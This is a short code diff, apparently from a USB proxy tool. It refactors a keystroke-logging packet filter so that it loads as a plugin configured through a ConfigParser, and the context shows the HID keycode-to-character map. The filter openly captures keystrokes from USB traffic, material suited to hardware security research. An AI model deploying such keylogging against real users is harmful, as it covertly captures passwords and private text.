@@ -26,8 +26,8 @@
 #include "PacketFilter_KeyLogger.h"
 #include <memory.h>
 
-PacketFilter_KeyLogger::PacketFilter_KeyLogger(FILE* _file) {
-	file=_file;
+PacketFilter_KeyLogger::PacketFilter_KeyLogger(ConfigParser *cfg) {
+	file  = (FILE *) cfg->get_pointer("PacketFilter_KeyLogger::file");
 	keyMap[0x04]="a";
 	keyMap[0x05]="b";
 	keyMap[0x06]="c";
@@ -236,4 +236,17 @@ void PacketFilter_KeyLogger::filter_packet(Packet* packet) {
 		keyPressed(0,newMods);
 	}
 	memcpy(lastReport,packet->data,8);
+}
+
+static PacketFilter_KeyLogger *proxy;
+
+extern "C" {
+	PacketFilter * get_filter_plugin(ConfigParser *cfg) {
+		proxy = new PacketFilter_KeyLogger(cfg);
+		return (PacketFilter *) proxy;
+	}
+	
+	void destroy_plugin() {
+		delete proxy;
+	}
 }
